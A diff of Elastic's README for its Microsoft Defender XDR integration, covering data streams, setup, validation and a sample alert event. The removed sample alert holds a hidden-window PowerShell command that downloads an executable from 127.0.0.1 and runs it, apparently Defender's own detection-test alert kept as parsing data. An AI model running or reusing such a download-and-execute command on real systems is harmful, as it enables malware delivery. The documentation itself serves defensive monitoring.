@@ -1,105 +1,152 @@
-# M365 Defender integration
+# Microsoft Defender XDR integration
 
 ## Overview
 
-The [Microsoft 365 Defender](https://learn.microsoft.com/en-us/microsoft-365/security/defender) integration allows you to monitor Alert, Incident (Microsoft Graph Security API), Event (Streaming API) Logs, and Vulnerability (Microsoft Defender for Endpoint API) Logs. Microsoft 365 Defender is a unified pre and post-breach enterprise defense suite that natively coordinates detection, prevention, investigation, and response across endpoints, identities, email, and applications to provide integrated protection against sophisticated attacks.
+The [Microsoft Defender XDR](https://learn.microsoft.com/en-us/defender-xdr/) integration allows you to monitor Alert, Incident (Microsoft Graph Security API), Event (Streaming API) Logs, and Vulnerability (Microsoft Defender for Endpoint API) Logs. Microsoft Defender XDR is a unified pre and post-breach enterprise defense suite that natively coordinates detection, prevention, investigation, and response across endpoints, identities, email, and applications to provide integrated protection against sophisticated attacks.
 
-Use the Microsoft 365 Defender integration to collect and parse data from the Microsoft Azure Event Hub, Microsoft Graph Security v1.0 REST API, and the Micrsoft Defender Endpoint API. Then visualise that data in Kibana.
+### How it works
 
-For example, you could use the data from this integration to consolidate and correlate security alerts from multiple sources. Also, by looking into the alert, incident, and vulnerability a user can take an appropriate action in the Microsoft 365 Defender Portal.
+The integration works by collecting data from the Microsoft Azure Event Hub, Microsoft Graph Security REST API, and the Microsoft Defender Endpoint API.
 
-## Data streams
+### Compatibility
 
-The Microsoft 365 Defender integration collects logs for four types of events: Alert, Event, Incident, and Vulnerability.
+This integration supports below API versions to collect data.
+  - [Microsoft Graph Security REST API v1.0](https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview?view=graph-rest-1.0)
+    - [Alerts](https://learn.microsoft.com/en-us/graph/api/security-list-alerts_v2?view=graph-rest-1.0)
+    - [Incidents](https://learn.microsoft.com/en-us/graph/api/security-list-incidents?view=graph-rest-1.0)
+  - [Microsoft Defender for Endpoint API v1.0](https://learn.microsoft.com/en-us/defender-endpoint/api/exposed-apis-list)
+    - [Vulnerabilities](https://learn.microsoft.com/en-us/defender-endpoint/api/get-assessment-software-vulnerabilities#2-export-software-vulnerabilities-assessment-via-files)
+  - [Microsoft Defender XDR Streaming API](https://learn.microsoft.com/en-us/defender-xdr/streaming-api?view=o365-worldwide)
+    - Supported Microsoft Defender XDR Streaming event types are listed below. For more details on all available event types, refer to [documentation](https://learn.microsoft.com/en-us/defender-xdr/supported-event-types).
+| Resource types            | Description                                                                                                                                                                       |
+| ---------------------------| -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| AlertEvidence             | Files, IP addresses, URLs, users, or devices associated with alerts.                                                                                                              |
+| AlertInfo                 | Alerts from M365 Defender XDR services, including severity and threat categorization.                                                                                             |
+| CloudAppEvents            | Events involving accounts and objects in Office 365 and other cloud apps and services.                                                                                            |
+| DeviceEvents              | Event types, including events triggered by security controls.                                                                                                                     |
+| DeviceFileCertificateInfo | Certificate information of signed files obtained from certificate verification events on endpoints.                                                                               |
+| DeviceFileEvents          | File creation, modification, and other file system events.                                                                                                                        |
+| DeviceImageLoadEvents     | DLL loading events.                                                                                                                                                               |
+| DeviceInfo                | Machine information, including OS information.                                                                                                                                    |
+| DeviceLogonEvents         | Sign-ins and other authentication events on devices.                                                                                                                              |
+| DeviceNetworkEvents       | Network connection and related events.                                                                                                                                            |
+| DeviceNetworkInfo         | Network properties of devices, as well as connected networks and domains.                                                                                                         |
+| DeviceProcessEvents       | Process creation and related events.                                                                                                                                              |
+| DeviceRegistryEvents      | Creation and modification of registry entries.                                                                                                                                    |
+| EmailAttachmentInfo       | Information about files attached to emails.                                                                                                                                       |
+| EmailEvents               | Microsoft 365 email events, including email delivery and blocking events.                                                                                                         |
+| EmailPostDeliveryEvents   | Security events that occur post-delivery, after Microsoft 365 delivers the emails to the recipient mailbox.                                                                       |
+| EmailUrlInfo              | Information about URLs in emails.                                                                                                                                                 |
+| IdentityInfo              | Account information from various sources, including Microsoft Entra ID.                                                                                                           |
+| IdentityLogonEvents       | Authentication events on Active Directory and Microsoft online services.                                                                                                          |
+| IdentityQueryEvents       | Queries for Active Directory objects, such as users, groups, devices, and domains.                                                                                                |
+| IdentityDirectoryEvents   | Events involving an on-premises domain controller running Active Directory (AD). This table covers a range of identity-related events and system events on the domain controller. |
+| UrlClickEvent             | Safe Links clicks from email messages, Teams, and Office 365 apps.                                                                                                                |
 
-**Alert:** This data streams leverages the [Microsoft Graph Security API](https://learn.microsoft.com/en-us/graph/api/resources/security-alert?view=graph-rest-1.0) to collect alerts including suspicious activities in a customer's tenant that Microsoft or partner security providers have identified and flagged for action.
+## What data does this integration collect?
 
-**Event (Recommended):** This data stream leverages the [M365 Defender Streaming API](https://learn.microsoft.com/en-us/microsoft-365/security/defender/streaming-api?view=o365-worldwide) to collect Alert, Device, Email, App and Identity Events. Events are streamed to an Azure Event Hub. For a list of Supported Events exposed by the Streaming API and supported by Elastic's integration, please see Microsoft's documentation [here](https://learn.microsoft.com/en-us/microsoft-365/security/defender/supported-event-types?view=o365-worldwide).
+The Microsoft Defender XDR integration collects logs for four types of events: Alerts, Events, Incidents, and Vulnerabilities.
 
-**Incidents and Alerts (Recommended):** This data streams leverages the [Microsoft Graph Security API](https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview?view=graph-rest-1.0) to ingest a collection of correlated alert instances and associated metadata that reflects the story of an attack in M365D. Incidents stemming from Microsoft 365 Defender, Microsoft Defender for Endpoint, Microsoft Defender for Office 365, Microsoft Defender for Identity, Microsoft Defender for Cloud Apps, and Microsoft Purview Data Loss Prevention are supported by this integration.
+**Incidents:** This data streams uses the [Microsoft Graph Security API](https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview?view=graph-rest-1.0)'s [`/security/incidents`](https://learn.microsoft.com/en-us/graph/api/security-list-incidents?view=graph-rest-1.0) endpoint to ingest a collection of correlated alert instances and associated metadata that reflects the story of an attack in Microsoft Defender XDR. Incidents stemming from Microsoft Defender XDR, Microsoft Defender for Endpoint, Microsoft Defender for Office 365, Microsoft Defender for Identity, Microsoft Defender for Cloud Apps, and Microsoft Purview Data Loss Prevention are supported by this integration. This is recommended over **Alerts** because it fetches correlated incidents including all associated alerts and evidence.
 
-**Vulnerability:** This data stream uses the [Microsoft Defender for Endpoint API](https://learn.microsoft.com/en-us/defender-endpoint/api/exposed-apis-list) to gather vulnerability details by fetching data from three different endpoints — [vulnerabilities](https://learn.microsoft.com/en-us/defender-endpoint/api/get-all-vulnerabilities), [machines](https://learn.microsoft.com/en-us/defender-endpoint/api/get-machines), and [software/products](https://learn.microsoft.com/en-us/defender-endpoint/api/get-all-vulnerabilities-by-machines). The collected data is then correlated and mapped to generate a single, enriched log per vulnerability, providing a clear view of risks across machines and installed software in your environment.
+**Alerts:** This data streams uses the [Microsoft Graph Security API](https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview?view=graph-rest-1.0)'s [`/security/alerts_v2`](https://learn.microsoft.com/en-us/graph/api/security-list-alerts_v2?view=graph-rest-1.0) endpoint to collect alerts including suspicious activities in a customer's tenant that Microsoft or partner security providers have identified and flagged for action. **Incidents** is recommended over **Alerts** if you want to fetch correlated incidents including all associated alerts and evidence.
 
-## Requirements
+**Events:** This data stream uses the [Microsoft Defender XDR Streaming API](https://learn.microsoft.com/en-us/defender-xdr/streaming-api?view=o365-worldwide) to collect Alert, Device, Email, App and Identity Events. Events are streamed to an Azure Event Hub. For a list of supported events exposed by the Streaming API and supported by Elastic's integration, please refer to Microsoft's documentation [here](https://learn.microsoft.com/en-us/defender-xdr/supported-event-types?view=o365-worldwide).
 
-You need Elasticsearch for storing and searching your data and Kibana for visualizing and managing it. You can use our hosted Elasticsearch Service on Elastic Cloud, which is recommended, or self-manage the Elastic Stack on your own hardware.
+**Vulnerabilities:** This data stream uses the [Microsoft Defender for Endpoint API](https://learn.microsoft.com/en-us/defender-endpoint/api/exposed-apis-list)'s [`/api/machines/SoftwareVulnerabilitiesExport`](https://learn.microsoft.com/en-us/defender-endpoint/api/get-assessment-software-vulnerabilities#2-export-software-vulnerabilities-assessment-via-files) endpoint to collect vulnerability assessments.
 
-This module has used **Microsoft Azure Event Hub** for Streaming Event, **Microsoft Graph Security v1.0 REST API** for Incident data stream and **Microsoft Defender for Endpoint API** for Vulnerability data stream.
+**Note:** The **Alerts** data stream ingests individual detection events surfaced by Microsoft and partner security providers, while **Incidents** data stream ingests correlated collections of alerts that represent a broader attack.
 
-For **Event**, using filebeat's [Azure Event Hub](https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-input-azure-eventhub.html) input, state such as leases on partitions and checkpoints in the event stream are shared between receivers using an Azure Storage container. For this reason, as a prerequisite to using this input, users will have to create or use an existing storage account.
+### Supported Use Cases
 
-### Agentless enabled integration
-Agentless integrations allow you to collect data without having to manage Elastic Agent in your cloud. They make manual agent deployment unnecessary, so you can focus on your data instead of the agent that collects it. For more information, refer to [Agentless integrations](https://www.elastic.co/guide/en/serverless/current/security-agentless-integrations.html) and the [Agentless integrations FAQ](https://www.elastic.co/guide/en/serverless/current/agentless-integration-troubleshooting.html).
+Use the data from this integration to consolidate and correlate security alerts from multiple sources. Also, by looking into the alert, incident, and vulnerability a user can take an appropriate action in the Microsoft Defender XDR Portal.
 
-Agentless deployments are only supported in Elastic Serverless and Elastic Cloud environments.  This functionality is in beta and is subject to change. Beta features are not subject to the support SLA of official GA features.
+## What do I need to use this integration?
 
-### Agent-based installation
+### From Elastic
 
-Elastic Agent must be installed. For more details, check the Elastic Agent [installation instructions](docs-content://reference/fleet/install-elastic-agents.md). You can install only one Elastic Agent per host.
+Version `4.0.0` of the Microsoft Defender XDR integration adds [Elastic latest transforms](https://www.elastic.co/docs/explore-analyze/transforms/transform-overview#latest-transform-overview). For more details, refer to the Transform setup and requirements [documentation](https://www.elastic.co/docs/explore-analyze/transforms/transform-setup).
 
-## Compatibility
-###  This integration supports below API versions to collect data.
-  - [Microsoft Graph Security v1.0 REST API](https://learn.microsoft.com/en-us/graph/api/resources/security-alert?view=graph-rest-1.0)
-  - [M365 Defender Streaming API](https://learn.microsoft.com/en-us/microsoft-365/security/defender/streaming-api?view=o365-worldwide)
-    Supported Microsoft 365 Defender streaming event types:
-      | Resource types            | Description               |
-    |---------------------------|---------------------------|
-    | AlertEvidence             | Files, IP addresses, URLs, users, or devices associated with alerts. |
-    | AlertInfo                 | Alerts from M365 Defender XDR services, including severity and threat categorization. |
-    | DeviceEvents              | Event types, including events triggered by security controls. |
-    | DeviceFileCertificateInfo | Certificate information of signed files obtained from certificate verification events on endpoints. |
-    | DeviceFileEvents          | File creation, modification, and other file system events. |
-    | DeviceImageLoadEvents     | DLL loading events. |
-    | DeviceInfo                | Machine information, including OS information. |
-    | DeviceLogonEvents         | Sign-ins and other authentication events on devices. |
-    | DeviceNetworkEvents       | Network connection and related events. |
-    | DeviceNetworkInfo         | Network properties of devices, as well as connected networks and domains. |
-    | DeviceProcessEvents       | Process creation and related events. |
-    | DeviceRegistryEvents      | Creation and modification of registry entries. |
-    | EmailAttachmentInfo       | Information about files attached to emails. |
-    | EmailEvents               | Microsoft 365 email events, including email delivery and blocking events. |
-    | EmailPostDeliveryEvents   | Security events that occur post-delivery, after Microsoft 365 delivers the emails to the recipient mailbox. |
-    | EmailUrlInfo              | Information about URLs in emails. |
-    | IdentityInfo              | Account information from various sources, including Microsoft Entra ID. |
-    | IdentityLogonEvents       | Authentication events on Active Directory and Microsoft online services. |
-    | IdentityQueryEvents       | Queries for Active Directory objects, such as users, groups, devices, and domains. |
-    | IdentityDirectoryEvents   | Events involving an on-premises domain controller running Active Directory (AD). This table covers a range of identity-related events and system events on the domain controller. |
-    | CloudAppEvents            | Events involving accounts and objects in Office 365 and other cloud apps and services. |
-    | UrlClickEvent             | Safe Links clicks from email messages, Teams, and Office 365 apps. |
-  - [Microsoft Defender for Endpoint API](https://learn.microsoft.com/en-us/defender-endpoint/api/exposed-apis-list)
-    - [Vulnerabilities API](https://learn.microsoft.com/en-us/defender-endpoint/api/get-all-vulnerabilities) (Last updated On 04/25/2024)
-    - [Machines API](https://learn.microsoft.com/en-us/defender-endpoint/api/get-machines) (Last updated On 03/01/2025)
-    - [software/products API](https://learn.microsoft.com/en-us/defender-endpoint/api/get-all-vulnerabilities-by-machines) (Last updated On 04/25/2024)
+### From Microsoft Defender XDR
+Follow the steps below to configure data collection from Microsoft sources.
 
-## Setup
+#### 1. Collecting Data using Azure Event Hub
 
-### Follow the steps below to configure data collection from Microsoft sources:
+- [Configure Microsoft Defender XDR to stream Advanced Hunting events to your Azure Event Hub](https://learn.microsoft.com/en-us/defender-xdr/streaming-api-event-hub?view=o365-worldwide).
+- A Blob Storage account is required in order to store/retrieve/update the offset or state of the eventhub messages. This means that after stopping filebeat it can start back up at the spot that it stopped processing messages.
 
-### 1. Collecting Data from Microsoft Azure Event Hub
-- [Configure Microsoft 365 Defender to stream Advanced Hunting events to your Azure Event Hub](https://learn.microsoft.com/en-us/microsoft-365/security/defender/streaming-api-event-hub?view=o365-worldwide).
+#### 2. Collecting Data using Microsoft Graph Security REST API (for Incidents & Alerts)
 
-### 2. Collecting Data from Microsoft Graph Security v1.0 REST API (for Incidents & Alerts)
 - [Register a new Azure Application](https://learn.microsoft.com/en-us/graph/auth-register-app-v2?view=graph-rest-1.0).
-- Assign the required permission: **SecurityIncident.Read.All**. See more details [here](https://learn.microsoft.com/en-us/graph/auth-v2-service?view=graph-rest-1.0).
+- Assign the required permission: **SecurityIncident.Read.All**. Refer to [this documentation](https://learn.microsoft.com/en-us/graph/auth-v2-service?view=graph-rest-1.0&tabs=http#step-1-configure-permissions-for-microsoft-graph) on how to configure permissions. Refer to [documentation](https://learn.microsoft.com/en-us/graph/api/security-list-incidents?view=graph-rest-1.0&tabs=http#permissions) on required permissions for incidents and alerts.
 - Once the application is registered, note the following values for use during configuration:
   - Client ID
   - Client Secret
   - Tenant ID
 
-### 3. Collecting Data from Microsoft Defender for Endpoint API (for Vulnerabilities)
+#### 3. Collecting Data using Microsoft Defender for Endpoint API (for Vulnerabilities)
+
 - [Register a new Azure Application](https://learn.microsoft.com/en-us/graph/auth-register-app-v2?view=graph-rest-1.0).
-- Assign the required permissions: 
-  - **Vulnerability.Read.All** See more details [here](https://learn.microsoft.com/en-us/defender-endpoint/api/get-all-vulnerabilities#permissions).
-  - **Machine.Read.All** See more details [here](https://learn.microsoft.com/en-us/defender-endpoint/api/get-machines#permissions).
+- Assign the required permissions: **Vulnerability.Read.All**. Refer to [this documentation](https://learn.microsoft.com/en-us/graph/auth-v2-service?view=graph-rest-1.0&tabs=http#step-1-configure-permissions-for-microsoft-graph) on how to configure permissions. Refer to [this documentation](https://learn.microsoft.com/en-us/defender-endpoint/api/get-assessment-software-vulnerabilities#22-permissions) on required permissions for vulnerability.
 - After registration, retrieve the following credentials needed for configuration:
   - Client ID
   - Client Secret
   - Tenant ID
 
-### Data Retention and ILM Configuration
-A full sync pulls in a large volume of data, which can lead to storage issues or index overflow over time. To avoid this, we’ve set up an Index Lifecycle Management (ILM) policy that automatically deletes data older than 7 days. This helps keep storage usage under control.
+## How do I deploy this integration?
 
-> **Note:** The user or service account associated with the integration must have the following **index privileges** on the relevant index have the following permissions `delete`, `delete_index`
+This integration supports both Elastic Agentless-based and Agent-based installations.
+
+### Agentless-based installation
+
+Agentless integrations allow you to collect data without having to manage Elastic Agent in your cloud. They make manual agent deployment unnecessary, so you can focus on your data instead of the agent that collects it. For more information, refer to [Agentless integrations](https://www.elastic.co/guide/en/serverless/current/security-agentless-integrations.html) and the [Agentless integrations FAQ](https://www.elastic.co/guide/en/serverless/current/agentless-integration-troubleshooting.html).
+
+Agentless deployments are only supported in Elastic Serverless and Elastic Cloud environments. This functionality is in beta and is subject to change. Beta features are not subject to the support SLA of official GA features.
+
+### Agent-based installation
+
+Elastic Agent must be installed. For more details, check the Elastic Agent [installation instructions](docs-content://reference/fleet/install-elastic-agents.md). You can install only one Elastic Agent per host.
+
+## Setup
+
+1. In the top search bar in Kibana, search for **Integrations**.
+2. In the search bar, type **Microsoft Defender XDR**.
+3. Select the **Microsoft Defender XDR** integration from the search results.
+4. Select **Add Microsoft Defender XDR** to add the integration.
+5. Enable and configure only the collection methods which you will use.
+
+    * To **Collect alerts and incidents using Microsoft Graph Security API**, you'll need to:
+
+        - Configure **Client ID**, **Client Secret** and **Tenant ID**.
+    * To **Collect vulnerabilities using Microsoft Defender for Endpoint API**, you'll need to:
+
+        - Configure **Client ID**, **Client Secret** and **Tenant ID**. Configure either **Subscription ID** or **Management Group Name** as the scope.
+    * To **Collect events using Azure Event Hub**, you'll need to:
+
+        - Configure **Azure Event Hub**, **Connection String**, **Storage Account**, and **storage_account_key**.
+
+6. Select **Save and continue** to save the integration.
+
+### Validation
+
+#### Dashboards populated
+
+1. In the top search bar in Kibana, search for **Dashboards**.
+2. In the search bar, type **Microsoft Defender XDR**.
+3. Select a dashboard for the dataset you are collecting, and verify the dashboard information is populated.
+
+#### Transforms healthy
+
+1. In the top search bar in Kibana, search for **Transforms**.
+2. Select the **Data / Transforms** from the search results.
+3. In the search bar, type **m365_defender**.
+4. All transforms from the search results should indicate **Healthy** under the **Health** column.
+
+### Data Retention and ILM Configuration
+
+A full sync pulls in a large volume of data, which can lead to storage issues or index overflow over time. To avoid this, we have set up an Index Lifecycle Management (ILM) policy that automatically deletes data older than 7 days. This helps keep storage usage under control.
+
+> **Note:** The user or service account associated with the integration must have the following **index privileges** on the relevant index have the following permissions `delete`, `delete_index`.
 
 ## Alert severity mapping
 
@@ -112,7 +159,17 @@ The values used in `event.severity` are consistent with Elastic Detection Rules.
 | High                   | 73               |
 | Critical               | 99               |
 
-## Logs reference
+## Troubleshooting
+
+- Expiring SAS URLs: The option `SAS Valid Hours` in `vulnerability` data stream controls the duration that the `Shared Access Signature (SAS)` download URLs are valid for. The default value of this option is `1h` i.e., 1 hour, and the maximum allowed value is `6h` i.e., 6 hours. Increase the value of the option `SAS Valid Hours` when you see `error.message` indicates signatures are invalid, or when you notice invalid signature errors inside CEL trace logs.
+
+## Scaling
+
+For more information on architectures that can be used for scaling this integration, check the [Ingest Architectures](https://www.elastic.co/docs/manage-data/ingest/ingest-reference-architectures) documentation.
+
+## Reference
+
+### log
 
 ### alert
 
@@ -126,11 +183,11 @@ An example event for `alert` looks as following:
 {
     "@timestamp": "2023-10-20T09:54:07.503Z",
     "agent": {
-        "ephemeral_id": "5e4d1adc-4724-42e2-8bce-1bd3e7e7f7de",
-        "id": "0565bad7-c286-4eed-ba44-49dde64f4313",
-        "name": "elastic-agent-28236",
+        "ephemeral_id": "f0b1ddcf-5c43-49cb-be37-acefdf4372d0",
+        "id": "d6e963cc-04ee-46b8-af02-520891431883",
+        "name": "elastic-agent-85133",
         "type": "filebeat",
-        "version": "8.18.0"
+        "version": "8.19.4"
     },
     "cloud": {
         "account": {
@@ -139,7 +196,7 @@ An example event for `alert` looks as following:
     },
     "data_stream": {
         "dataset": "m365_defender.alert",
-        "namespace": "95822",
+        "namespace": "57227",
         "type": "logs"
     },
     "device": {
@@ -151,29 +208,23 @@ An example event for `alert` looks as following:
         "version": "8.11.0"
     },
     "elastic_agent": {
-        "id": "0565bad7-c286-4eed-ba44-49dde64f4313",
+        "id": "d6e963cc-04ee-46b8-af02-520891431883",
         "snapshot": false,
-        "version": "8.18.0"
+        "version": "8.19.4"
     },
     "event": {
-        "action": [
-            "detected"
-        ],
         "agent_id_status": "verified",
         "category": [
-            "host",
-            "iam",
-            "network",
-            "process"
+            "host"
         ],
         "created": "2023-10-20T09:53:09.883Z",
         "dataset": "m365_defender.alert",
         "duration": 2478000000,
         "end": "2023-10-20T09:51:41.993Z",
         "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
-        "ingested": "2025-05-27T10:26:31Z",
+        "ingested": "2026-01-05T12:04:28Z",
         "kind": "alert",
-        "original": "{\"actorDisplayName\":null,\"additionalData\":null,\"alertPolicyId\":null,\"alertWebUrl\":\"https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"assignedTo\":null,\"category\":\"Execution\",\"classification\":null,\"comments\":[],\"createdDateTime\":\"2023-10-20T09:53:09.8839373Z\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"detectionSource\":\"microsoftDefenderForEndpoint\",\"detectorId\":\"7f1c3609-a3ff-40e2-995b-c01770161d68\",\"determination\":null,\"evidence\":[{\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"azureAdDeviceId\":\"f18bd540-d5e4-46e0-8ddd-3d03a59e4e14\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"defenderAvStatus\":\"notSupported\",\"detailedRoles\":[\"PrimaryDevice\"],\"deviceDnsName\":\"clw555test\",\"firstSeenDateTime\":\"2023-10-20T09:50:17.7383987Z\",\"healthStatus\":\"inactive\",\"ipInterfaces\":[\"192.168.5.65\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"loggedOnUsers\":[{\"accountName\":\"CDPUserIS-38411\",\"domainName\":\"AzureAD\"}],\"mdeDeviceId\":\"505d70d89cfa3428f7aac7d2eb3a64c60fd3d843\",\"onboardingStatus\":\"onboarded\",\"osBuild\":22621,\"osPlatform\":\"Windows11\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"riskScore\":\"high\",\"roles\":[],\"tags\":[],\"verdict\":\"unknown\",\"version\":\"22H2\",\"vmMetadata\":null},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"detailedRoles\":[],\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"CDPUserIS-38411\",\"azureAdUserId\":null,\"displayName\":null,\"domainName\":\"AzureAD\",\"userPrincipalName\":null,\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\"},\"verdict\":\"unknown\"},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"detailedRoles\":[],\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"url\":\"http://127.0.0.1/1.exe\",\"verdict\":\"suspicious\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"countryLetterCode\":null,\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"detailedRoles\":[],\"ipAddress\":\"127.0.0.1\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"verdict\":\"suspicious\"},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"detailedRoles\":[],\"detectionStatus\":\"detected\",\"imageFile\":{\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":491520,\"issuer\":null,\"sha1\":\"a72c41316307889e43fe8605a0dca4a72e72a011\",\"sha256\":\"d783ba6567faf10fdff2d0ea3864f6756862d6c733c7f4467283da81aedc3a80\",\"signer\":null},\"mdeDeviceId\":\"505d70d89cfa3428f7aac7d2eb3a64c60fd3d843\",\"parentProcessCreationDateTime\":\"2023-10-20T09:51:19.5064237Z\",\"parentProcessId\":5772,\"parentProcessImageFile\":{\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":323584,\"issuer\":null,\"sha1\":null,\"sha256\":null,\"signer\":null},\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2023-10-20T09:51:39.4997961Z\",\"processId\":8224,\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"CDPUserIS-38411\",\"azureAdUserId\":null,\"displayName\":null,\"domainName\":\"AzureAD\",\"userPrincipalName\":null,\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\"},\"verdict\":\"unknown\"}],\"firstActivityDateTime\":\"2023-10-20T09:51:39.5154802Z\",\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_1\",\"incidentId\":\"23\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/23?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"lastActivityDateTime\":\"2023-10-20T09:51:41.9939003Z\",\"lastUpdateDateTime\":\"2023-10-20T09:54:07.5033333Z\",\"mitreTechniques\":[\"T1059.001\"],\"productName\":\"Microsoft Defender for Endpoint\",\"providerAlertId\":\"efa1828b-dd4e-405c-8a3b-aa28596830dd_1\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C\\u0026C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"resolvedDateTime\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"severity\":\"medium\",\"status\":\"new\",\"tenantId\":\"3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"threatDisplayName\":null,\"threatFamilyName\":null,\"title\":\"Suspicious PowerShell command line\"}",
+        "original": "{\"actorDisplayName\":null,\"additionalData\":null,\"alertPolicyId\":null,\"alertWebUrl\":\"https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"assignedTo\":null,\"category\":\"Execution\",\"classification\":null,\"comments\":[],\"createdDateTime\":\"2023-10-20T09:53:09.8839373Z\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"detectionSource\":\"microsoftDefenderForEndpoint\",\"detectorId\":\"7f1c3609-a3ff-40e2-995b-c01770161d68\",\"determination\":null,\"evidence\":[{\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"azureAdDeviceId\":\"f18bd540-d5e4-46e0-8ddd-3d03a59e4e14\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"defenderAvStatus\":\"notSupported\",\"detailedRoles\":[\"PrimaryDevice\"],\"deviceDnsName\":\"clw555test\",\"firstSeenDateTime\":\"2023-10-20T09:50:17.7383987Z\",\"healthStatus\":\"inactive\",\"ipInterfaces\":[\"192.168.5.65\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"loggedOnUsers\":[{\"accountName\":\"CDPUserIS-38411\",\"domainName\":\"AzureAD\"}],\"mdeDeviceId\":\"505d70d89cfa3428f7aac7d2eb3a64c60fd3d843\",\"onboardingStatus\":\"onboarded\",\"osBuild\":22621,\"osPlatform\":\"Windows11\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"riskScore\":\"high\",\"roles\":[],\"tags\":[],\"verdict\":\"unknown\",\"version\":\"22H2\",\"vmMetadata\":null}],\"firstActivityDateTime\":\"2023-10-20T09:51:39.5154802Z\",\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_1\",\"incidentId\":\"23\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/23?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"lastActivityDateTime\":\"2023-10-20T09:51:41.9939003Z\",\"lastUpdateDateTime\":\"2023-10-20T09:54:07.5033333Z\",\"mitreTechniques\":[\"T1059.001\"],\"productName\":\"Microsoft Defender for Endpoint\",\"providerAlertId\":\"efa1828b-dd4e-405c-8a3b-aa28596830dd_1\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C\\u0026C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"resolvedDateTime\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"severity\":\"medium\",\"status\":\"new\",\"tenantId\":\"3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"threatDisplayName\":null,\"threatFamilyName\":null,\"title\":\"Suspicious PowerShell command line\"}",
         "provider": "microsoftDefenderForEndpoint",
         "severity": 47,
         "start": "2023-10-20T09:51:39.515Z",
@@ -183,11 +234,17 @@ An example event for `alert` looks as following:
         "url": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39"
     },
     "host": {
